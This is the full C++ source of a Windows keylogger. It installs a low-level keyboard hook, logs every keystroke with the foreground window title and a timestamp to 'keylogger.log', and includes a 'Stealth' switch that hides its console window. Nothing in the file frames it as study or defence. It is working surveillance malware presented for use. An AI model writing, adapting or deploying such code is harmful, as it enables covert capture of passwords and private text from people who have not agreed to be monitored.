#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR) window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);

            // get time
            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char s[64];
            strftime(s, sizeof(s), "%c", &tm);

            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

    if (key_stroke == VK_BACK)
    {
        output << "[BACKSPACE]";
    }
    else if (key_stroke == VK_RETURN)
    {
        output << "\n";
    }
    else if (key_stroke == VK_SPACE)
    {
        output << " ";
    }
    else if (key_stroke == VK_TAB)
    {
        output << "[TAB]";
    }
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
    {
        output << "[SHIFT]";
    }
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
    {
        output << "[CONTROL]";
    }
    else if (key_stroke == VK_ESCAPE)
    {
        output << "[ESCAPE]";
    }
    else if (key_stroke == VK_END)
    {
        output << "[END]";
    }
    else if (key_stroke == VK_HOME)
    {
        output << "[HOME]";
    }
    else if (key_stroke == VK_LEFT)
    {
        output << "[LEFT]";
    }
    else if (key_stroke == VK_UP)
    {
        output << "[UP]";
    }
    else if (key_stroke == VK_RIGHT)
    {
        output << "[RIGHT]";
    }
    else if (key_stroke == VK_DOWN)
    {
        output << "[DOWN]";
    }
    else if (key_stroke == 190 || key_stroke == 110)
    {
        output << ".";
    }
    else if (key_stroke == 189 || key_stroke == 109)
    {
        output << "-";
    }
    else if (key_stroke == 20)
    {
        output << "[CAPSLOCK]";
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }

    // instead of opening and closing file handlers every time, keep file open and flush.
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

int main()
{
    // open output file in append mode
    const char* output_filename = "keylogger.log";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    // visibility of window
    Stealth();

    // set the hook
    SetHook();

    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}